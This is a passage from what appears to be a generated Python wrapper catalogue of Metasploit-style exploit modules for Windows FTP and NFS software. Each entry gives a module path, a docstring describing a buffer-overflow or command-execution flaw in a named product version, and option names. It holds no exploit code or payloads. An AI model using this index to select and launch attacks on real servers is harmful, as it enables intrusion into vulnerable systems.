			FingerprintCheck = 'FingerprintCheck'
			required_DOMAIN = 'DOMAIN'
			HttpClientTimeout = 'HttpClientTimeout'
			HttpTrace = 'HttpTrace'
			HTTP_uri_encode_mode = 'HTTP::uri_encode_mode'
			HTTP_uri_full_url = 'HTTP::uri_full_url'
			HTTP_pad_method_uri_count = 'HTTP::pad_method_uri_count'
			HTTP_pad_uri_version_count = 'HTTP::pad_uri_version_count'
			HTTP_pad_method_uri_type = 'HTTP::pad_method_uri_type'
			HTTP_pad_uri_version_type = 'HTTP::pad_uri_version_type'
			HTTP_method_random_valid = 'HTTP::method_random_valid'
			HTTP_method_random_invalid = 'HTTP::method_random_invalid'
			HTTP_method_random_case = 'HTTP::method_random_case'
			HTTP_version_random_valid = 'HTTP::version_random_valid'
			HTTP_version_random_invalid = 'HTTP::version_random_invalid'
			HTTP_uri_dir_self_reference = 'HTTP::uri_dir_self_reference'
			HTTP_uri_dir_fake_relative = 'HTTP::uri_dir_fake_relative'
			HTTP_uri_use_backslashes = 'HTTP::uri_use_backslashes'
			HTTP_pad_fake_headers = 'HTTP::pad_fake_headers'
			HTTP_pad_fake_headers_count = 'HTTP::pad_fake_headers_count'
			HTTP_pad_get_params = 'HTTP::pad_get_params'
			HTTP_pad_get_params_count = 'HTTP::pad_get_params_count'
			HTTP_pad_post_params = 'HTTP::pad_post_params'
			HTTP_pad_post_params_count = 'HTTP::pad_post_params_count'
			HTTP_uri_fake_end = 'HTTP::uri_fake_end'
			HTTP_uri_fake_params_start = 'HTTP::uri_fake_params_start'
			HTTP_header_folding = 'HTTP::header_folding'

	class windows_nfs_xlink_nfsd(object):
		"""
		
          This module exploits a stack buffer overflow in Xlink Omni-NFS Server 5.2
        When sending a specially crafted nfs packet, an attacker may be able
        to execute arbitrary code.
      
		"""

		path = 'windows/nfs/xlink_nfsd'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'

	class windows_ftp_freefloatftp_user(object):
		"""
		
          Freefloat FTP Server is prone to an overflow condition. It
        fails to properly sanitize user-supplied input resulting in a
        stack-based buffer overflow. With a specially crafted 'USER'
        command, a remote attacker can potentially have an unspecified
        impact.
      
		"""

		path = 'windows/ftp/freefloatftp_user'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			FTPUSER = 'FTPUSER'
			FTPPASS = 'FTPPASS'
			required_FTPTimeout = 'FTPTimeout'
			FTPDEBUG = 'FTPDEBUG'

	class windows_ftp_sami_ftpd_user(object):
		"""
		
          This module exploits the KarjaSoft Sami FTP Server version 2.02
        by sending an excessively long USER string. The stack is overwritten
        when the administrator attempts to view the FTP logs. Therefore, this exploit
        is passive and requires end-user interaction. Keep this in mind when selecting
        payloads. When the server is restarted, it will re-execute the exploit until
        the logfile is manually deleted via the file system.
      
		"""

		path = 'windows/ftp/sami_ftpd_user'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			DynamicSehRecord = 'DynamicSehRecord'

	class windows_ftp_xlink_client(object):
		"""
		
          This module exploits a stack buffer overflow in Xlink FTP Client 32
        Version 3.01 that comes bundled with Omni-NFS Enterprise 5.2.
        When a overly long FTP server response is recieved by a client,
        arbitrary code may be executed.
      
		"""

		path = 'windows/ftp/xlink_client'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'

	class windows_ftp_easyftp_mkd_fixret(object):
		"""
		
          This module exploits a stack-based buffer overflow in EasyFTP Server 1.7.0.11
        and earlier. EasyFTP fails to check input size when parsing 'MKD' commands, which
        leads to a stack based buffer overflow.

        NOTE: EasyFTP allows anonymous access by default. However, in order to access the
        'MKD' command, you must have access to an account that can create directories.

        After version 1.7.0.12, this package was renamed "UplusFtp".

        This exploit utilizes a small piece of code that I/'ve referred to as 'fixRet'.
        This code allows us to inject of payload of ~500 bytes into a 264 byte buffer by
        'fixing' the return address post-exploitation.  See references for more information.
      
		"""

		path = 'windows/ftp/easyftp_mkd_fixret'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			FTPUSER = 'FTPUSER'
			FTPPASS = 'FTPPASS'
			required_FTPTimeout = 'FTPTimeout'
			FTPDEBUG = 'FTPDEBUG'

	class windows_ftp_oracle9i_xdb_ftp_pass(object):
		"""
		
          By passing an overly long string to the PASS command, a
        stack based buffer overflow occurs. David Litchfield, has
        illustrated multiple vulnerabilities in the Oracle 9i XML
        Database (XDB), during a seminar on "Variations in exploit
        methods between Linux and Windows" presented at the Blackhat
        conference.
      
		"""

		path = 'windows/ftp/oracle9i_xdb_ftp_pass'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			required_FTPTimeout = 'FTPTimeout'
			FTPDEBUG = 'FTPDEBUG'

	class windows_ftp_easyfilesharing_pass(object):
		"""
		
        This module exploits a stack buffer overflow in the Easy File Sharing 2.0
        service. By sending an overly long password, an attacker can execute
        arbitrary code.
      
		"""

		path = 'windows/ftp/easyfilesharing_pass'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			FTPUSER = 'FTPUSER'
			FTPPASS = 'FTPPASS'
			required_FTPTimeout = 'FTPTimeout'
			FTPDEBUG = 'FTPDEBUG'

	class windows_ftp_proftp_banner(object):
		"""
		
          This module exploits a buffer overflow in the ProFTP 2.9
        client that is triggered through an excessively long welcome message.
      
		"""

		path = 'windows/ftp/proftp_banner'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'

	class windows_ftp_absolute_ftp_list_bof(object):
		"""
		
        This module exploits VanDyke Software AbsoluteFTP by overflowing
        a filename buffer related to the LIST command.
      
		"""

		path = 'windows/ftp/absolute_ftp_list_bof'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			PASVPORT = 'PASVPORT'

	class windows_ftp_servu_mdtm(object):
		"""
		
          This is an exploit for the Serv-U/'s MDTM command timezone
        overflow. It has been heavily tested against versions
        4.0.0.4/4.1.0.0/4.1.0.3/5.0.0.0 with success against
        nt4/2k/xp/2k3. I have also had success against version 3,
        but only tested 1 version/os. The bug is in all versions
        prior to 5.0.0.4, but this exploit will not work against
        versions not listed above. You only get one shot, but it
        should be OS/SP independent.

        This exploit is a single hit, the service dies after the
        shellcode finishes execution.
      
		"""

		path = 'windows/ftp/servu_mdtm'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			FTPUSER = 'FTPUSER'
			FTPPASS = 'FTPPASS'
			required_FTPTimeout = 'FTPTimeout'
			FTPDEBUG = 'FTPDEBUG'
			SEHOffset = 'SEHOffset'
			ForceDoubling = 'ForceDoubling'

	class windows_ftp_filewrangler_list_reply(object):
		"""
		
          This module exploits a buffer overflow in the FileWrangler client
        that is triggered when the client connects to a FTP server and lists
        the directory contents, containing an overly long directory name.
      
		"""

		path = 'windows/ftp/filewrangler_list_reply'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			PASVPORT = 'PASVPORT'

	class windows_ftp_seagull_list_reply(object):
		"""
		
          This module exploits a buffer overflow in the Seagull FTP client that gets
        triggered when the ftp clients processes a response to a LIST command. If the
        response contains an overly long file/folder name, a buffer overflow occurs,
        overwriting a structured exception handler.
      
		"""

		path = 'windows/ftp/seagull_list_reply'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			PASVPORT = 'PASVPORT'

	class windows_ftp_ftpgetter_pwd_reply(object):
		"""
		
          This module exploits a buffer overflow in FTPGetter Standard v3.55.0.05 ftp client.
        When processing the response on a PWD command, a stack based buffer overflow occurs.
        This leads to arbitrary code execution when a structured exception handler gets
        overwritten.
      
		"""

		path = 'windows/ftp/ftpgetter_pwd_reply'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			PASVPORT = 'PASVPORT'

	class windows_ftp_wing_ftp_admin_exec(object):
		"""
		
        This module exploits the embedded Lua interpreter in the admin web interface for
        versions 4.3.8 and below. When supplying a specially crafted HTTP POST request
        an attacker can use os.execute() to execute arbitrary system commands on
        the target with SYSTEM privileges.
      
		"""

		path = 'windows/ftp/wing_ftp_admin_exec'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			CMDSTAGER_DECODER = 'CMDSTAGER::DECODER'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			VHOST = 'VHOST'
			Proxies = 'Proxies'
			UserAgent = 'UserAgent'
			HttpUsername = 'HttpUsername'
			HttpPassword = 'HttpPassword'
			DigestAuthIIS = 'DigestAuthIIS'
			SSLVersion = 'SSLVersion'
			FingerprintCheck = 'FingerprintCheck'
			required_DOMAIN = 'DOMAIN'
			HttpClientTimeout = 'HttpClientTimeout'
			HttpTrace = 'HttpTrace'
			HTTP_uri_encode_mode = 'HTTP::uri_encode_mode'
			HTTP_uri_full_url = 'HTTP::uri_full_url'
			HTTP_pad_method_uri_count = 'HTTP::pad_method_uri_count'
			HTTP_pad_uri_version_count = 'HTTP::pad_uri_version_count'
			HTTP_pad_method_uri_type = 'HTTP::pad_method_uri_type'
			HTTP_pad_uri_version_type = 'HTTP::pad_uri_version_type'
			HTTP_method_random_valid = 'HTTP::method_random_valid'
			HTTP_method_random_invalid = 'HTTP::method_random_invalid'
			HTTP_method_random_case = 'HTTP::method_random_case'
			HTTP_version_random_valid = 'HTTP::version_random_valid'
			HTTP_version_random_invalid = 'HTTP::version_random_invalid'
			HTTP_uri_dir_self_reference = 'HTTP::uri_dir_self_reference'
			HTTP_uri_dir_fake_relative = 'HTTP::uri_dir_fake_relative'
			HTTP_uri_use_backslashes = 'HTTP::uri_use_backslashes'
			HTTP_pad_fake_headers = 'HTTP::pad_fake_headers'
			HTTP_pad_fake_headers_count = 'HTTP::pad_fake_headers_count'
			HTTP_pad_get_params = 'HTTP::pad_get_params'
			HTTP_pad_get_params_count = 'HTTP::pad_get_params_count'
			HTTP_pad_post_params = 'HTTP::pad_post_params'
			HTTP_pad_post_params_count = 'HTTP::pad_post_params_count'
			HTTP_uri_fake_end = 'HTTP::uri_fake_end'
			HTTP_uri_fake_params_start = 'HTTP::uri_fake_params_start'
			required_USERNAME = 'USERNAME'
			required_PASSWORD = 'PASSWORD'

	class windows_ftp_winaxe_server_ready(object):
		"""
		
          This module exploits a buffer overflow in the WinaXe 7.7 FTP client.
        This issue is triggered when a client connects to the server and is
        expecting the Server Ready response.
      
		"""

		path = 'windows/ftp/winaxe_server_ready'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			PASVPORT = 'PASVPORT'

	class windows_ftp_dreamftp_format(object):
		"""
		
          This module exploits a format string overflow in the BolinTech
        Dream FTP Server version 1.02. Based on the exploit by SkyLined.
      
		"""

		path = 'windows/ftp/dreamftp_format'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'

	class windows_ftp_ability_server_stor(object):
		"""
		
        This module exploits a stack-based buffer overflow in Ability Server 2.34.
        Ability Server fails to check input size when parsing 'STOR' and 'APPE' commands,
        which leads to a stack based buffer overflow. This plugin uses the 'STOR' command.

        The vulnerability has been confirmed on version 2.34 and has also been reported
        in version 2.25 and 2.32. Other versions may also be affected.
      
		"""

		path = 'windows/ftp/ability_server_stor'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			required_FTPUSER = 'FTPUSER'
			required_FTPPASS = 'FTPPASS'
			required_FTPTimeout = 'FTPTimeout'
			FTPDEBUG = 'FTPDEBUG'

	class windows_ftp_ricoh_dl_bof(object):
		"""
		
          This module exploits a vulnerability found in Ricoh DC's DL-10 SR10 FTP
        service.  By supplying a long string of data to the USER command, it is
        possible to trigger a stack-based buffer overflow, which allows remote code
        execution under the context of the user.

          Please note that in order to trigger the vulnerability, the server must
        be configured with a log file name (by default, it's disabled).
      
		"""

		path = 'windows/ftp/ricoh_dl_bof'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			required_FTPTimeout = 'FTPTimeout'
			FTPDEBUG = 'FTPDEBUG'

	class windows_ftp_globalscapeftp_input(object):
		"""
		
          This module exploits a buffer overflow in the GlobalSCAPE Secure FTP Server.
        All versions prior to 3.0.3 are affected by this flaw. A valid user account (
        or anonymous access) is required for this exploit to work.
      
		"""

		path = 'windows/ftp/globalscapeftp_input'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			FTPUSER = 'FTPUSER'
			FTPPASS = 'FTPPASS'
			required_FTPTimeout = 'FTPTimeout'
			FTPDEBUG = 'FTPDEBUG'

	class windows_ftp_xlink_server(object):
		"""
		
          This module exploits a stack buffer overflow in Xlink FTP Server
        that comes bundled with Omni-NFS Enterprise 5.2.
        When a overly long FTP request is sent to the server,
        arbitrary code may be executed.
      
		"""

		path = 'windows/ftp/xlink_server'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			required_FTPTimeout = 'FTPTimeout'
			FTPDEBUG = 'FTPDEBUG'

	class windows_ftp_bison_ftp_bof(object):
		"""
		
        BisonWare BisonFTP Server 3.5 is prone to an overflow condition.
        This module exploits a buffer overflow vulnerability in the said
        application.
      
		"""

		path = 'windows/ftp/bison_ftp_bof'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			FTPUSER = 'FTPUSER'
			FTPPASS = 'FTPPASS'
			required_FTPTimeout = 'FTPTimeout'
			FTPDEBUG = 'FTPDEBUG'

	class windows_ftp_netterm_netftpd_user(object):
		"""
		
          This module exploits a vulnerability in the NetTerm NetFTPD
        application. This package is part of the NetTerm package.
        This module uses the USER command to trigger the overflow.
      
		"""

		path = 'windows/ftp/netterm_netftpd_user'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			FTPUSER = 'FTPUSER'
			FTPPASS = 'FTPPASS'
			required_FTPTimeout = 'FTPTimeout'
			FTPDEBUG = 'FTPDEBUG'

	class windows_ftp_ftpshell51_pwd_reply(object):
		"""
		
          This module exploits a stack buffer overflow in FTPShell 5.1. The overflow gets
        triggered when the ftp clients tries to process an overly response to a PWD command.
        This will overwrite the saved EIP and structured exception handler.
      
		"""

		path = 'windows/ftp/ftpshell51_pwd_reply'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			PASVPORT = 'PASVPORT'

	class windows_ftp_goldenftp_pass_bof(object):
		"""
		
          This module exploits a vulnerability in the Golden FTP service, using the PASS
        command to cause a buffer overflow.  Please note that in order trigger the vulnerable
        code, the victim machine must have the "Show new connections" setting enabled.  By
        default, this option is unchecked.
      
		"""

		path = 'windows/ftp/goldenftp_pass_bof'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			FTPUSER = 'FTPUSER'
			FTPPASS = 'FTPPASS'
			required_FTPTimeout = 'FTPTimeout'
			FTPDEBUG = 'FTPDEBUG'

	class windows_ftp_open_ftpd_wbem(object):
		"""
		
        This module exploits multiple vulnerabilities found in Open&Compact FTP
        server. The software contains an authentication bypass vulnerability and a
        arbitrary file upload vulnerability that allows a remote attacker to write
        arbitrary files to the file system as long as there is at least one user
        who has permission.

        Code execution can be achieved by first uploading the payload to the remote
        machine as an exe file, and then upload another mof file, which enables
        WMI (Management Instrumentation service) to execute the uploaded payload.
